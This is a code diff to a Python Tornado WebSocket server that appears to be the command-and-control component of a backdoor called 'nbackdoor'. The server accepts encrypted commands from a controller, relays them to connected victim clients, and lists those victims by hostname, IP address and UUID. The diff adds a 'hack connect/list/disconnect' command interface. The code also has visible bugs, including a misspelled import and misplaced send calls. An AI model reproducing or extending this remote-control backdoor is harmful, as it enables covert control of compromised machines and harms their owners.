@@ -1,5 +1,7 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
+import shlex
+from _docpot import docopt
 import tornado.web
 import tornado.websocket
 import tornado.ioloop
@@ -23,14 +25,15 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         for key, c in self.clients:
             c.write_message(json.dumps(message))
 
-    def __init__(self, application, request, **kwargs):
-        tornado.websocket.WebSocketHandler.__init__(self, application, request, **kwargs)
+    def __init__(self, app, request, **kwargs):
+        tornado.websocket.WebSocketHandler.__init__(self, app, request, **kwargs)
         self.HOST_NAME = None
         self.ID = None
         self.UUID = None
         self.IV = '\0' * AES.block_size
         self.SECRET = None
         self.is_controller = False
+        self.to_client_id = None
         self.jobs = list()
 
     def encrypt(self, text):
@@ -46,8 +49,18 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
     def open(self):
         pass
 
+    def on_close(self):
+        if self.ID in self.clients:
+            self.clients.pop(self.ID)
+
     def send_data(self, data):
-        self.write_message(self.encrypt(json.dumps({'data': data})))
+        self.write_message(self.encrypt(json.dumps({'data': b64encode(data)})))
+
+    def send_end(self):
+        self.write_message(self.encrypt(json.dumps({'end': 'true'})))
+
+    def send_json(self, jsonobj):
+        self.write_message(self.encrypt(json.dumps(jsonobj)))
 
     def on_message(self, message):
         if self.UUID and self.SECRET:
@@ -56,49 +69,51 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
             msg = json.loads(json_str)
 
             if self.is_controller and 'cmd' in msg:
-                command = msg['cmd']
-                if command == 'list':
-                    data = 'List all online backdoor-clients:\n'
-                    for key, client in self.clients.items():
-                        data += str(key) + '\t' + client.UUID + '\t' + \
-                                client.request.remote_ip + '\t' + client.HOST_NAME + '\n'
-                    self.send_data(data)
+                command = b64decode(msg['cmd'])
+                print command
+                self.parse_command(command)
 
-                elif command == 'jobs':
-                    data = 'List all jobs:\n\n'
-                    for job in self.jobs:
-                        data += job[0] + '\nResult:\n' + job[1] + '\n\n'
-                    self.send_data(data)
-
-                elif 'to' in msg:
-                    # --Transfer--
-                    to = int(msg['to'])
-                    if to in self.clients:
-                        to_client = self.clients[to]
-                        if not to_client.is_controller:
-                            msg['jobid'] = str(len(self.jobs))
-                            msg['from'] = self.ID
-                            msg_json = json.dumps(msg)
-                            to_client.write_message(to_client.encrypt(msg_json))
-                            self.jobs.append([msg_json, 'Running'])
-                            self.send_data('Send command to client success.\n')
-
-                        else:
-                            self.send_data('Should not send control command to controller.\n')
-
-                    else:
-                        self.send_data('Not available target.\n')
-
-            elif 'jobid' in msg:
-                to = int(msg['to'])
-                jobid = int(msg['jobid'])
-                if to in self.clients:
-                    to_client = self.clients[to]
-                    to_client.jobs[jobid][1] = msg['rlt']
-                pass
+                # pass
+                # '''
+                # ======================
+                # === Server Command ===
+                # ======================
+                # '''
+                # if command == 'hack':
+                #
+                #     data = 'List all online backdoor-clients:\n'
+                #     for key, client in self.clients.items():
+                #         data += str(key) + '\t' + client.UUID + '\t' + \
+                #                 client.request.remote_ip + '\t' + client.HOST_NAME + '\n'
+                #     self.send_data(data)
+                #
+                # elif 'to' in msg:
+                #     '''
+                #     ======================
+                #     === Client Command ===
+                #     ======================
+                #     '''
+                #     to = int(msg['to'])
+                #     if to in self.clients:
+                #         to_client = self.clients[to]
+                #         if not to_client.is_controller:
+                #             msg['jobid'] = str(len(self.jobs))
+                #             msg['from'] = self.ID
+                #             msg_json = json.dumps(msg)
+                #             to_client.write_message(to_client.encrypt(msg_json))
+                #             self.jobs.append([msg_json, 'Running'])
+                #             self.send_data('Send command to client success.\n')
+                #
+                #         else:
+                #             self.send_data('Should not send control command to controller.\n')
+                #
+                #     else:
+                #         self.send_data('Not available target.\n')
 
         else:
-            # --Login--
+            # =====================
+            # ======= Login =======
+            # =====================
             msg = json.loads(message)
 
             if 'uuid' in msg:
@@ -118,9 +133,82 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 print 'find new client: ' + str(self.ID) + ' -- ' + self.request.remote_ip + '(' + self.UUID + ')'
                 BackdoorSocketHandler.ID_LASTEST += 1
 
-    def on_close(self):
-        if self.ID in self.clients:
-            self.clients.pop(self.ID)
+    def parse_command(self, cmd):
+        input_array = shlex.split(cmd)
+
+        command_str = input_array[0]
+        if command_str != 'hack':
+            self.send_data('No aviable command.\n')
+            self.send_end()
+            return
+
+        try:
+            arguments_str = input_array[1:]
+            doc = """Usage:
+  hack connect <client_id>
+  hack (list|disconnect)
+  hack (-h | --help)
+  hack new thread
+  hack --version
+
+Options:
+  connect <client_id>   Connect to client.
+  list                  List all online client.
+  disconnect            Disconnect linked client.
+  -h --help             Show this.
+  --version             Show version.
+"""
+            args = docopt(doc, argv=arguments_str, help=True, version='nbackdoor 0.1', options_first=False)
+
+            # ===================
+            # ===== connect =====
+            # ===================
+            if args['connect']:
+                to = int(args['<client_id>'])
+                if to in self.clients:
+                    to_client = self.clients[to]
+                    if not to_client.is_controller:
+                        self.to_client_id = int(args['<client_id>'])
+                        self.send_json({'connected': str(self.to_client_id)})
+
+                    else:
+                        self.send_data('You can not connect to a control-client.\n')
+                        self.send_end()
+
+                else:
+                    self.send_data('Not available target.\n')
+                    self.send_end()
+
+            # ====================
+            # ==== disconnect ====
+            # ====================
+            elif args['disconnect']:
+                if self.to_client_id:
+                    self.to_client_id = None
+                    self.send_json({'disconnected': str(self.to_client_id)})
+
+                else:
+                    self.send_data('You have not connected to any clients.\n')
+                    self.send_end()
+
+            # ====================
+            # ======= list =======
+            # ====================
+            elif args['list']:
+                data = ''
+                for key, client in self.clients.items():
+                    data += str(key) + '\t' + client.HOST_NAME + '\t' + \
+                            client.request.remote_ip + '\t' + client.UUID + '\n'
+                    self.send_data(data)
+                    self.send_end()
+
+        except SystemExit as e:
+            self.send_data(e.message)
+            self.send_end()
+
+        except Exception as e:
+            self.send_data('unkown err: ' + e.message + '\n')
+            self.send_end()
 
 
 application = tornado.web.Application([
